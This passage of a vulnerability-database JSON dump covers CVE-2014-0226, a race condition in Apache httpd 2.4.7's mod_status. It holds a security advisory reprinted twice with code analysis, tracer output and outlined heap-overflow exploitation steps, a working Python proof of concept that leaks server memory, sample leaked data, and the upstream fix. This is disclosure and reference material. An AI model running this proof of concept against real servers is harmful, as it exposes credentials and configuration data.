status_handler\r\n/home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839\r\n(mod_status.so+0x0000000044b0)\r\n    #3 ap_run_handler ??:0 (exe+0x000000084d98)\r\n    #4 ap_invoke_handler ??:0 (exe+0x00000008606e)\r\n    #5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)\r\n    #6 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b143e)\r\n    #7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #8 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #9 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #10 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #12  :0 (libtsan.so.0+0x00000001b279)\r\n\r\n  Previous write of size 1 at 0x7feff2b862b8 by thread T2:\r\n    #0 update_child_status_internal scoreboard.c:0\r\n(exe+0x00000004d4c6)\r\n    #1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)\r\n    #2 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b139a)\r\n    #3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #4 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #5 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #6 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #8  :0 (libtsan.so.0+0x00000001b279)\r\n--[ 3. Consequences\r\n\r\nRace condition described in section 2, may lead to:\r\n\r\n - information leak in case when the string returned by\r\nap_escape_logitem is not  at the end,\r\n   junk after copied bytes may be valuable\r\n - overwriting heap with a user supplied value which may imply code\r\nexecution\r\n--[ 4. Exploitation\r\n\r\n In order to exploit the heap overflow bug it's necessary to get\r\ncontrol over:\r\n\r\n 1) triggering the race-condition bug\r\n 2) allocating 's' and 'd' strings in the ap_escape_html2 to overlap\r\n 3) part of 's' which doesn't overlap with 'd' (this string is copied\r\nover and over again)\r\n 4) overwriting the heap in order to get total control over the cpu or\r\nat least modify the\r\n    apache's handler code flow for our benefits\r\n--[ 5. Information Disclosure Proof of Concept\r\n\r\n    -- cut\r\n    #! /usr/bin/env python\r\n\r\n    import httplib\r\n    import sys\r\n    import threading\r\n    import subprocess\r\n    import random\r\n\r\n    def send_request(method, url):\r\n        try:\r\n            c = httplib.HTTPConnection('127.0.0.1', 80)\r\n            c.request(method,url);\r\n            if \"foo\" in url:\r\n                print c.getresponse().read()\r\n            c.close()\r\n        except Exception, e:\r\n            print e\r\n            pass\r\n\r\n    def mod_status_thread():\r\n        while True:\r\n            send_request(\"GET\", \"/foo?notables\")\r\n\r\n    def requests():\r\n        evil = ''.join('A' for i in range(random.randint(0, 1024)))\r\n        while True:\r\n            send_request(evil, evil)\r\n\r\n    threading.Thread(target=mod_status_thread).start()\r\n    threading.Thread(target=requests).start()\r\n\r\n    -- cut\r\n\r\nBelow are the information leak samples gathered by running the poc\r\nagainst the\r\ntesting Apache instance. Leaks include i.e. HTTP headers, htaccess\r\ncontent,\r\nhttpd.conf content etc. On a live systems with a higher traffic\r\nsamples should\r\nbe way more interesting.\r\n\r\n $ ./poc.py | grep \"\" |grep -v AAAA | grep -v \"{}\"| grep -v notables\r\n 127.0.0.1 {A} []\r\n 127.0.0.1 {A.01 cu0 cs0\r\n 127.0.0.1 {A27.0.0.1} []\r\n 127.0.0.1 {A|0|10 [Dead] u.01 s.01 cu0 cs0\r\n 127.0.0.1 {A\r\n                \u00db []\r\n 127.0.0.1 {A HTTP/1.1} []\r\n 127.0.0.1 {Ab><br />\r\n 127.0.0.1 {AAA}</i> <b>[127.0.1.1:19666]</b><br\r\n/>\r\n 127.0.0.1 {A0.1.1:19666]</b><br />\r\n 127.0.0.1 {A\u00a7} []\r\n 127.0.0.1 {A cs0\r\n 127.0.0.1 {Adentity\r\n 127.0.0.1 {A HTTP/1.1} []\r\n 127.0.0.1 {Ape: text/html; charset=ISO-8859-1\r\n 127.0.0.1 {Ahome/IjonTichy/httpd-2.4.7-vanilla/htdocs/} []\r\n 127.0.0.1 {A\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff} []\r\n 127.0.0.1 {Aanilla/htdocs/foo} []\r\n 127.0.0.1 {A0n/httpd-2.4.7-vanilla/htdocs/foo/} []\r\n 127.0.0.1 {A.........................................     } []\r\n 127.0.0.1 {A-2014 16:23:30 CEST} []\r\n 127.0.0.1 {Acontent of htaccess\r\n 127.0.0.1 {Aver: Apache/2.4.7 (Unix)\r\n 127.0.0.1 {Aroxy:balancer://mycluster} []\r\nWe hope you enjoyed it.\r\n\r\nRegards,\r\nMarek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466\r\n\r\n\r\n",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:34133"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2014-07-21T00:00:00",
            "published": "2014-07-21T00:00:00",
            "href": "https://packetstormsecurity.com/files/127546/Apache-Scoreboard-Status-Race-Condition.html",
            "id": "PACKETSTORM:127546",
            "type": "packetstorm",
            "title": "Apache Scoreboard / Status Race Condition",
            "sourceData": "` ::: ::::::::: ::: :::::::: ::: ::::::::::::: ::: :::::::::::::::::::::::::::::::::: :::::::::   \n:+: :+: :+: :+: :+: :+: :+: :+::+: :+::+: :+: :+: :+: :+: :+: :+::+: :+:   \n+:+ +:+ +:+ +:++:+ +:+ +:+ +:+ +:++:+ +:+ +:+ +:+ +:+ +:+ +:++:+ +:+   \n+#++:++#++:+#++:++#++#++:++#++:+#+ +#++:++#+++#++:++# +#++:++#++ +#+ +#+ +#++:++#+ +#+ +:+   \n+#+ +#++#+ +#+ +#++#+ +#+ +#++#+ +#+ +#+ +#+ +#+ +#+ +#+ +#+   \n#+# #+##+# #+# #+##+# #+##+# #+##+# #+# #+# #+# #+# #+# #+# #+#   \n### ###### ### ### ######## ### ############# ### ### ### ### ### #########   \n  \n:::::::: ::: ::::::::::::: :::::::: ::::::: ::: ::: ::::::: :::::::: :::::::: ::::::::   \n:+: :+::+: :+::+: :+: :+::+: :+::+:+: :+: :+: :+::+: :+::+: :+::+: :+:   \n+:+ +:+ +:++:+ +:+ +:+ :+:+ +:+ +:+ +:+ +:+ :+:+ +:+ +:+ +:+   \n+#+ +#+ +:++#++:++# #++:++ +#+ +#+ + +:+ +#+ +#+ +:+ #++:++ #+ + +:+ +#+ +#+ +#++:++#+   \n+#+ +#+ +#+ +#+ +#+ +#+# +#+ +#++#+#+#+#+#+ +#+# +#+ +#+ +#+ +#+ +#+   \n#+# #+# #+#+#+# #+# #+# #+# #+# #+# #+# #+# #+# #+# #+# #+# #+#   \n######## ### ########## ########## ####### ####### ### ####### #################### ########   \n  \n+:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:++:+:+:+:+:+:+  \n+#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#++#+#+#+#+#+#+  \n  \n  \nHi there,  \n  \n--[ 0. Sparse summary   \nRace condition between updating httpd's \"scoreboard\" and mod_status,   \nleading to several critical scenarios like heap buffer overflow with user   \nsupplied payload and leaking heap which can leak critical memory containing   \nhtaccess credentials, ssl certificates private keys and so on.   \n  \n  \n--[ 1. Prerequisites  \n  \nApache httpd compiled with MPM event or MPM worker.  \nThe tested version was 2.4.7 compiled with:  \n  \n./configure --enable-mods-shared=reallyall --with-included-apr  \n  \nThe tested mod_status configuration in httpd.conf was:  \n  \n<Location /foo>  \nSetHandler server-status  \n</Location>  \nExtendedStatus On  \n  \n  \n--[ 2. Race Condition  \n  \nFunction ap_escape_logitem in server/util.c looks as follows:  \n  \n1908AP_DECLARE(char *) ap_escape_logitem(apr_pool_t *p, const char *str)  \n1909{  \n1910 char *ret;  \n1911 unsigned char *d;  \n1912 const unsigned char *s;  \n1913 apr_size_t length, escapes = 0;  \n1914  \n1915 if (!str) {  \n1916 return NULL;  \n1917 }  \n1918  \n1919 /* Compute how many characters need to be escaped */  \n1920 s = (const unsigned char *)str;  \n1921 for (; *s; ++s) {  \n1922 if (TEST_CHAR(*s, T_ESCAPE_LOGITEM)) {  \n1923 escapes++;  \n1924 }  \n1925 }  \n1926  \n1927 /* Compute the length of the input string, including NULL */  \n1928 length = s - (const unsigned char *)str + 1;  \n1929  \n1930 /* Fast path: nothing to escape */  \n1931 if (escapes == 0) {  \n1932 return apr_pmemdup(p, str, length);  \n1933 }  \n  \nIn the for-loop between 1921 and 1925 lines function is computing the length of  \nsupplied str (almost like strlen, but additionally it counts special characters  \nwhich need to be escaped). As comment in 1927 value says, function computes count  \nof bytes to copy. If there's nothing to escape function uses apr_pmemdup to duplicate  \nthe str. In our single-threaded mind everything looks good, but tricky part starts  \nwhen we introduce multi-threading. Apache in MPM mode runs workers as threads, let's  \nconsider the following scenario:  \n  \n1) ap_escape_logitem(pool, \"\") is called  \n2) for-loop in 1921 line immediately escapes, because *s is \\0 in first loop run  \n3) malicious thread change memory under *s to another value (something which is not \\0)  \n4) apr_pmemdup copies that change value to new string and returns it  \n  \nOutput from the ap_escape_logitem is considered to be a string, if scenario above would occur,  \nthen returned string would not be zeroed at the end, which may be harmful. The mod_status  \ncode looks as follows:  \n  \n833 ap_rprintf(r, \"</td><td>%s</td><td nowrap>%s</td>\"  \n834 \"<td nowrap>%s</td></tr>\\n\\n\",  \n835 ap_escape_html(r->pool,  \n836 ws_record->client),  \n837 ap_escape_html(r->pool,  \n838 ws_record->vhost),  \n839 ap_escape_html(r->pool,  \n840 ap_escape_logitem(r->pool,  \n841 ws_record->request)));  \n  \nThe relevant call to ap_escape_html() is at line 839 after the evaluation of ap_escape_logitem().  \nThe first argument passed to the ap_escape_logitem() is in fact an apr pool associated with  \nthe HTTP request and defined in the request_rec structure.  \n  \nThis code is a part of a larger for-loop where code is iterating over worker_score structs which is  \ndefined as follows:  \n  \n90struct worker_score {  \n91#if APR_HAS_THREADS  \n92 apr_os_thread_t tid;  \n93#endif  \n94 int thread_num;  \n95 /* With some MPMs (e.g., worker), a worker_score can represent  \n96 * a thread in a terminating process which is no longer  \n97 * represented by the corresponding process_score. These MPMs  \n98 * should set pid and generation fields in the worker_score.  \n99 */  \n100 pid_t pid;  \n101 ap_generation_t generation;  \n102 unsigned char status;  \n103 unsigned short conn_count;  \n104 apr_off_t conn_bytes;  \n105 unsigned long access_count;  \n106 apr_off_t bytes_served;  \n107 unsigned long my_access_count;  \n108 apr_off_t my_bytes_served;  \n109 apr_time_t start_time;  \n110 apr_time_t stop_time;  \n111 apr_time_t last_used;  \n112#ifdef HAVE_TIMES  \n113 struct tms times;  \n114#endif  \n115 char client[40]; /* Keep 'em small... but large enough to hold an IPv6 address */  \n116 char request[64]; /* We just want an idea... */  \n117 char vhost[32]; /* What virtual host is being accessed? */  \n118};  \n  \nThe 'request' field in a worker_score structure is particularly interesting - this field can be changed inside  \nthe copy_request function, which is called by the update_child_status_internal. This change may occur when the  \nmod_status is iterating over the workers at the same time the ap_escape_logitem is called within a different  \nthread, leading to a race condition. We can trigger this exact scenario in order to return a string without a  \ntrailing \\0. This can be achived by running two clients, one triggering the mod_status handler and second  \nsending random requests to the web server. Let's consider the following example:  \n  \n1) the mod_status iterates over workers invoking update_child_status_internal()  \n2) at some point for one worker mod_status calls ap_escape_logitem(pool, ws_record->request)  \n3) let's asume that ws_record->request at the beginning is \"\" literally \\0 at the first byte.  \n4) inside the ap_escape_logitem function the length of the ws_record->request is computed, which is 1  \n(an empty string consisting of \\0)  \n5) another thread modifies ws_record->request (in fact it's called ws->request in update_child_status_internal  \nfunction but it's exactly the same location in memory) and puts there i.e. \"GET / HTTP/1.0\"  \n6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the first one byte from \"GET / HTTP/1.0\" - \"G\" in  \nthat case and returns it. The ap_pmemdup looks as follows:  \n  \n112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void *m, apr_size_t n)  \n113{  \n114 void *res;  \n115  \n116 if (m == NULL)  \n117 return NULL;  \n118 res = apr_palloc(a, n);  \n119 memcpy(res, m, n);  \n120 return res;  \n  \nIt allocates memory using apr_palloc function which returns \"ditry\" memory (note that apr_pcalloc overwrite  \nallocated memory with NULs).  \n  \nSo it's non-deterministic what's after the copied \"G\" byte. There might be \\0 or might be not. For now let's  \nassume that the memory allocated by apr_palloc was dirty (containing random bytes).  \n7) ap_escape_logitem returns \"G.....\" .junk. \"\\0\"  \n  \nThe value from the example above is then pushed to the ap_escape_html2 function which is also declared in util.c:  \n  \n1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char *s, int toasc)  \n1861{  \n1862 int i, j;  \n1863 char *x;  \n1864  \n1865 /* first, count the number of extra characters */  \n1866 for (i = 0, j = 0; s[i] != '\\0'; i++)  \n1867 if (s[i] == '<' || s[i] == '>')  \n1868 j += 3;  \n1869 else if (s[i] == '&')  \n1870 j += 4;  \n1871 else if (s[i] == '\"')  \n1872 j += 5;  \n1873 else if (toasc && !apr_isascii(s[i]))  \n1874 j += 5;  \n1875  \n1876 if (j == 0)  \n1877 return apr_pstrmemdup(p, s, i);  \n1878  \n1879 x = apr_palloc(p, i + j + 1);  \n1880 for (i = 0, j = 0; s[i] != '\\0'; i++, j++)  \n1881 if (s[i] == '<') {  \n1882 memcpy(&x[j], \"<\", 4);  \n1883 j += 3;  \n1884 }  \n1885 else if (s[i] == '>') {  \n1886 memcpy(&x[j], \">\", 4);  \n1887 j += 3;  \n1888 }  \n1889 else if (s[i] == '&') {  \n1890 memcpy(&x[j], \"&\", 5);  \n1891 j += 4;  \n1892 }  \n1893 else if (s[i] == '\"') {  \n1894 memcpy(&x[j], \"\"\", 6);  \n1895 j += 5;  \n1896 }  \n1897 else if (toasc && !apr_isascii(s[i])) {  \n1898 char *esc = apr_psprintf(p, \"&#%3.3d;\", (unsigned char)s[i]);  \n1899 memcpy(&x[j], esc, 6);  \n1900 j += 5;  \n1901 }  \n1902 else  \n1903 x[j] = s[i];  \n1904  \n1905 x[j] = '\\0';  \n1906 return x;  \n1907}  \n  \nIf the string from the example above would be passed to this function we should get the following code-flow:  \n  \n1) in the for-loop started in line 1866 we count the length of escaped string  \n2) because 's' string contains junk (due to only one byte being allocated by the apr_palloc function),  \nit may contain '>' character. Let's assume that this is our case  \n3) after for-loop in 1866 line 'j' is greater than 0 (at least one s[i] equals '>' as assumed above  \n4) in the 1879 line memory for escaped 'd' string is allocated  \n5) for-loop started in line 1880 copies string 's' to the escaped 'd' string BUT apr_palloc has allocated  \nonly one byte for 's'. Thus, for each i > 0 the loop reads random memory and copies that value  \nto 'd' string. At this point it's possible to trigger an information leak vulnerability (see section 5).  \n  \nHowever the 's' string may overlap with 'd' i.e.:  \n  \n's' is allocated under 0 with contents s = \"AAAAAAAA>\\0\"  \n'd' is allocated under 8 then s[8] = d[0].  \n  \nIf that would be the case, then for-loop would run forever (s[i] never would be \\0 since it was overwritten in the loop  \nby non-zero). Forever... until it hits an unmapped memory or read only area.  \n  \nPart of the scoreboard.c code which may overwrite the ws_record->request was discovered using a tsan:  \n  \n#1 ap_escape_logitem ??:0 (exe+0x0000000411f2)  \n#2 status_handler /home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839 (mod_status.so+0x0000000044b0)  \n#3 ap_run_handler ??:0 (exe+0x000000084d98)  \n#4 ap_invoke_handler ??:0 (exe+0x00000008606e)  \n#5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)  \n#6 ap_process_http_async_connection http_core.c:0 (exe+0x0000000b143e)  \n#7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)  \n#8 ap_run_process_connection ??:0 (exe+0x00000009d156)  \n#9 process_socket event.c:0 (exe+0x0000000cc65e)  \n#10 worker_thread event.c:0 (exe+0x0000000d0945)  \n#11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)  \n#12 <null> <null>:0 (libtsan.so.0+0x00000001b279)  \n  \nPrevious write of size 1 at 0x7feff2b862b8 by thread T2:  \n#0 update_child_status_internal scoreboard.c:0 (exe+0x00000004d4c6)  \n#1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)  \n#2 ap_process_http_async_connection http_core.c:0 (exe+0x0000000b139a)  \n#3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)  \n#4 ap_run_process_connection ??:0 (exe+0x00000009d156)  \n#5 process_socket event.c:0 (exe+0x0000000cc65e)  \n#6 worker_thread event.c:0 (exe+0x0000000d0945)  \n#7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)  \n#8 <null> <null>:0 (libtsan.so.0+0x00000001b279)  \n  \n  \n--[ 3. Consequences  \n  \nRace condition described in section 2, may lead to:  \n  \n- information leak in case when the string returned by ap_escape_logitem is not \\0 at the end,  \njunk after copied bytes may be valuable  \n- overwriting heap with a user supplied value which may imply code execution  \n  \n  \n--[ 4. Exploitation  \n  \nIn order to exploit the heap overflow bug it's necessary to get control over:  \n  \n1) triggering the race-condition bug  \n2) allocating 's' and 'd' strings in the ap_escape_html2 to overlap  \n3) part of 's' which doesn't overlap with 'd' (this string is copied over and over again)  \n4) overwriting the heap in order to get total control over the cpu or at least modify the  \napache's handler code flow for our benefits  \n  \n  \n--[ 5. Information Disclosure Proof of Concept  \n  \n-- cut  \n#! /usr/bin/env python  \n  \nimport httplib  \nimport sys  \nimport threading  \nimport subprocess  \nimport random  \n  \ndef send_request(method, url):  \ntry:  \nc = httplib.HTTPConnection('127.0.0.1', 80)  \nc.request(method,url);  \nif \"foo\" in url:  \nprint c.getresponse().read()  \nc.close()  \nexcept Exception, e:  \nprint e  \npass  \n  \ndef mod_status_thread():  \nwhile True:  \nsend_request(\"GET\", \"/foo?notables\")  \n  \ndef requests():  \nevil = ''.join('A' for i in range(random.randint(0, 1024)))  \nwhile True:  \nsend_request(evil, evil)  \n  \nthreading.Thread(target=mod_status_thread).start()  \nthreading.Thread(target=requests).start()  \n  \n-- cut   \n  \nBelow are the information leak samples gathered by running the poc against the  \ntesting Apache instance. Leaks include i.e. HTTP headers, htaccess content,  \nhttpd.conf content etc. On a live systems with a higher traffic samples should  \nbe way more interesting.  \n  \n$ ./poc.py | grep \"<i>\" |grep -v AAAA | grep -v \"{}\"| grep -v notables  \n<i>127.0.0.1 {A}</i> <b>[]</b><br />  \n<i>127.0.0.1 {A.01 cu0 cs0  \n<i>127.0.0.1 {A27.0.0.1}</i> <b>[]</b><br />  \n<i>127.0.0.1 {A|0|10 [Dead] u.01 s.01 cu0 cs0  \n<i>127.0.0.1 {A  \n\u00db</i> <b>[]</b><br />  \n<i>127.0.0.1 {A HTTP/1.1}</i> <b>[]</b><br />  \n<i>127.0.0.1 {Ab><br />  \n<i>127.0.0.1 {AAA}</i> <b>[127.0.1.1:19666]</b><br />  \n<i>127.0.0.1 {A0.1.1:19666]</b><br />  \n<i>127.0.0.1 {A\u00a7}</i> <b>[]</b><br />  \n<i>127.0.0.1 {A cs0  \n<i>127.0.0.1 {Adentity  \n<i>127.0.0.1 {A HTTP/1.1}</i> <b>[]</b><br />  \n<i>127.0.0.1 {Ape: text/html; charset=ISO-8859-1  \n<i>127.0.0.1 {Ahome/IjonTichy/httpd-2.4.7-vanilla/htdocs/}</i> <b>[]</b><br />  \n<i>127.0.0.1 {A\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff\u00ff}</i> <b>[]</b><br />  \n<i>127.0.0.1 {Aanilla/htdocs/foo}</i> <b>[]</b><br />  \n<i>127.0.0.1 {A0n/httpd-2.4.7-vanilla/htdocs/foo/}</i> <b>[]</b><br />  \n<i>127.0.0.1 {A......................................... }</i> <b>[]</b><br />  \n<i>127.0.0.1 {A-2014 16:23:30 CEST}</i> <b>[]</b><br />  \n<i>127.0.0.1 {Acontent of htaccess  \n<i>127.0.0.1 {Aver: Apache/2.4.7 (Unix)  \n<i>127.0.0.1 {Aroxy:balancer://mycluster}</i> <b>[]</b><br />  \n  \n  \nWe hope you enjoyed it.  \n  \nRegards,  \nMarek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466  \n  \n`\n",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:127546"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category dos / poc",
            "modified": "2014-07-20T00:00:00",
            "published": "2014-07-20T00:00:00",
            "id": "1337DAY-ID-22451",
            "href": "https://0day.today/exploit/description/22451",
            "type": "zdt",
            "title": "Apache 2.4.7 httpd mod_status Heap Buffer Overflow Vulnerability",
            "sourceData": "URL: http://svn.apache.org/r1610499\r\nLog:\r\nMerge 1610491 from trunk:\r\n\r\nSECURITY (CVE-2014-0226): Fix a race condition in scoreboard handling,\r\nwhich could lead to a heap buffer overflow. Thanks to Marek Kroemeke\r\nworking with HP's Zero Day Initiative for reporting this.\r\n\r\n* include/scoreboard.h: Add ap_copy_scoreboard_worker.\r\n\r\n* server/scoreboard.c (ap_copy_scoreboard_worker): New function.\r\n\r\n* modules/generators/mod_status.c (status_handler): Use it.\r\n\r\n* modules/lua/lua_request.c (lua_ap_scoreboard_worker): Likewise.\r\n\r\nReviewed by: trawick, jorton, covener, jim\r\nSubmitted by: jorton, covener\r\n\r\nModified:\r\nhttpd/httpd/branches/2.4.x/ (props changed)\r\nhttpd/httpd/branches/2.4.x/CHANGES\r\nhttpd/httpd/branches/2.4.x/include/ap_mmn.h\r\nhttpd/httpd/branches/2.4.x/include/scoreboard.h\r\nhttpd/httpd/branches/2.4.x/modules/generators/mod_status.c\r\nhttpd/httpd/branches/2.4.x/modules/lua/lua_request.c\r\nhttpd/httpd/branches/2.4.x/server/scoreboard.c\r\n\r\nPropchange: httpd/httpd/branches/2.4.x/\r\n------------------------------------------------------------------------------\r\nMerged /httpd/httpd/trunk:r1610491\r\n\r\nModified: httpd/httpd/branches/2.4.x/CHANGES\r\nURL:\r\nhttp://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/CHANGES?rev=1610499&r1=1610498&r2=1610499&view=diff\r\n==============================================================================\r\n--- httpd/httpd/branches/2.4.x/CHANGES [utf-8] (original)\r\n+++ httpd/httpd/branches/2.4.x/CHANGES [utf-8] Mon Jul 14 19:55:04 2014\r\n@@ -2,6 +2,10 @@\r\n\r\nChanges with Apache 2.4.10\r\n\r\n+ *) SECURITY: CVE-2014-0226 (cve.mitre.org)\r\n+ Fix a race condition in scoreboard handling, which could lead to\r\n+ a heap buffer overflow. [Joe Orton]\r\n+\r\n*) mod_ssl: Extend the scope of SSLSessionCacheTimeout to sessions\r\nresumed by TLS session resumption (RFC 5077). [Rainer Jung]\r\n\r\n\r\nModified: httpd/httpd/branches/2.4.x/include/ap_mmn.h\r\nURL:\r\nhttp://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/include/ap_mmn.h?rev=1610499&r1=1610498&r2=1610499&v\r\niew=diff\r\n==============================================================================\r\n--- httpd/httpd/branches/2.4.x/include/ap_mmn.h (original)\r\n+++ httpd/httpd/branches/2.4.x/include/ap_mmn.h Mon Jul 14 19:55:04 2014\r\n@@ -431,6 +431,7 @@\r\n* 20120211.34 (2.4.10-dev) AP_DEFAULT_HANDLER_NAME/AP_IS_DEFAULT_HANDLER_NAME\r\n* 20120211.35 (2.4.10-dev) Add \"r\", \"must_rebind\", and last_backend_conn\r\nto util_ldap_connection_t\r\n+ * 20120211.36 (2.4.10-dev) Add ap_copy_scoreboard_worker()\r\n*/\r\n\r\n#define MODULE_MAGIC_COOKIE 0x41503234UL /* \"AP24\" */\r\n@@ -438,7 +439,7 @@\r\n#ifndef MODULE_MAGIC_NUMBER_MAJOR\r\n#define MODULE_MAGIC_NUMBER_MAJOR 20120211\r\n#endif\r\n-#define MODULE_MAGIC_NUMBER_MINOR 35 /* 0...n */\r\n+#define MODULE_MAGIC_NUMBER_MINOR 36 /* 0...n */\r\n\r\n/**\r\n* Determine if the server's current MODULE_MAGIC_NUMBER is at least a\r\n\r\nModified: httpd/httpd/branches/2.4.x/include/scoreboard.h\r\nURL:\r\nhttp://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/include/scoreboard.h?rev=1610499&r1=1610498&r2=1610499&a\r\nmp;view=diff\r\n==============================================================================\r\n--- httpd/httpd/branches/2.4.x/include/scoreboard.h (original)\r\n+++ httpd/httpd/branches/2.4.x/include/scoreboard.h Mon Jul 14 19:55:04 2014\r\n@@ -183,8 +183,25 @@ AP_DECLARE(int) ap_update_child_status_f\r\nAP_DECLARE(void) ap_time_process_request(ap_sb_handle_t *sbh, int status);\r\n\r\nAP_DECLARE(worker_score *) ap_get_scoreboard_worker(ap_sb_handle_t *sbh);\r\n+\r\n+/** Return a pointer to the worker_score for a given child, thread pair.\r\n+ * @param child_num The child number.\r\n+ * @param thread_num The thread number.\r\n+ * @return A pointer to the worker_score structure.\r\n+ * @deprecated This function is deprecated, use ap_copy_scoreboard_worker instead. */\r\nAP_DECLARE(worker_score *) ap_get_scoreboard_worker_from_indexes(int child_num,\r\nint thread_num);\r\n+\r\n+/** Copy the contents of a worker scoreboard entry. The contents of\r\n+ * the worker_score structure are copied verbatim into the dest\r\n+ * structure.\r\n+ * @param dest Output parameter.\r\n+ * @param child_num The child number.\r\n+ * @param thread_num The thread number.\r\n+ */\r\n+AP_DECLARE(void) ap_copy_scoreboard_worker(worker_score *dest,\r\n+ int child_num, int thread_num);\r\n+\r\nAP_DECLARE(process_score *) ap_get_scoreboard_process(int x);\r\nAP_DECLARE(global_score *) ap_get_scoreboard_global(void);\r\n\r\n\r\nModified: httpd/httpd/branches/2.4.x/modules/generators/mod_status.c\r\nURL:\r\nhttp://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/modules/generators/mod_status.c?rev=1610499&r1=1610498&r\r\n2=1610499&view=diff\r\n==============================================================================\r\n--- httpd/httpd/branches/2.4.x/modules/generators/mod_status.c (original)\r\n+++ httpd/httpd/branches/2.4.x/modules/generators/mod_status.c Mon Jul 14 19:55:04 2014\r\n@@ -194,7 +194,7 @@ static int status_handler(request_rec *r\r\nlong req_time;\r\nint short_report;\r\nint no_table_report;\r\n- worker_score *ws_record;\r\n+ worker_score *ws_record = apr_palloc(r->pool, sizeof *ws_record);\r\nprocess_score *ps_record;\r\nchar *stat_buffer;\r\npid_t *pid_buffer, worker_pid;\r\n@@ -306,7 +306,7 @@ static int status_handler(request_rec *r\r\nfor (j = 0; j < thread_limit; ++j) {\r\nint indx = (i * thread_limit) + j;\r\n\r\n- ws_record = ap_get_scoreboard_worker_from_indexes(i, j);\r\n+ ap_copy_scoreboard_worker(ws_record, i, j);\r\nres = ws_record->status;\r\n\r\nif ((i >= max_servers || j >= threads_per_child)\r\n@@ -637,7 +637,7 @@ static int status_handler(request_rec *r\r\n\r\nfor (i = 0; i < server_limit; ++i) {\r\nfor (j = 0; j < thread_limit; ++j) {\r\n- ws_record = ap_get_scoreboard_worker_from_indexes(i, j);\r\n+ ap_copy_scoreboard_worker(ws_record, i, j);\r\n\r\nif (ws_record->access_count == 0 &&\r\n(ws_record->status == SERVER_READY ||\r\n\r\nModified: httpd/httpd/branches/2.4.x/modules/lua/lua_request.c\r\nURL:\r\nhttp://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/modules/lua/lua_request.c?rev=1610499&r1=1610498&r2=1610\r\n499&view=diff\r\n==============================================================================\r\n--- httpd/httpd/branches/2.4.x/modules/lua/lua_request.c (original)\r\n+++ httpd/httpd/branches/2.4.x/modules/lua/lua_request.c Mon Jul 14 19:55:04 2014\r\n@@ -1245,16 +1245,22 @@ static int lua_ap_scoreboard_process(lua\r\n*/\r\nstatic int lua_ap_scoreboard_worker(lua_State *L)\r\n{\r\n- int i,\r\n- j;\r\n- worker_score *ws_record;\r\n+ int i, j;\r\n+ worker_score *ws_record = NULL;\r\n+ request_rec *r = NULL;\r\n\r\nluaL_checktype(L, 1, LUA_TUSERDATA);\r\nluaL_checktype(L, 2, LUA_TNUMBER);\r\nluaL_checktype(L, 3, LUA_TNUMBER);\r\n+\r\n+ r = ap_lua_check_request_rec(L, 1);\r\n+ if (!r) return 0;\r\n+\r\ni = lua_tointeger(L, 2);\r\nj = lua_tointeger(L, 3);\r\n- ws_record = ap_get_scoreboard_worker_from_indexes(i, j);\r\n+ ws_record = apr_palloc(r->pool, sizeof *ws_record);\r\n+\r\n+ ap_copy_scoreboard_worker(ws_record, i, j);\r\nif (ws_record) {\r\nlua_newtable(L);\r\n\r\n\r\nModified: httpd/httpd/branches/2.4.x/server/scoreboard.c\r\nURL:\r\nhttp://svn.apache.org/viewvc/httpd/httpd/branches/2.4.x/server/scoreboard.c?rev=1610499&r1=1610498&r2=1610499&am\r\np;view=diff\r\n==============================================================================\r\n--- httpd/httpd/branches/2.4.x/server/scoreboard.c (original)\r\n+++ httpd/httpd/branches/2.4.x/server/scoreboard.c Mon Jul 14 19:55:04 2014\r\n@@ -579,6 +579,21 @@ AP_DECLARE(worker_score *) ap_get_scoreb\r\nsbh->thread_num);\r\n}\r\n\r\n+AP_DECLARE(void) 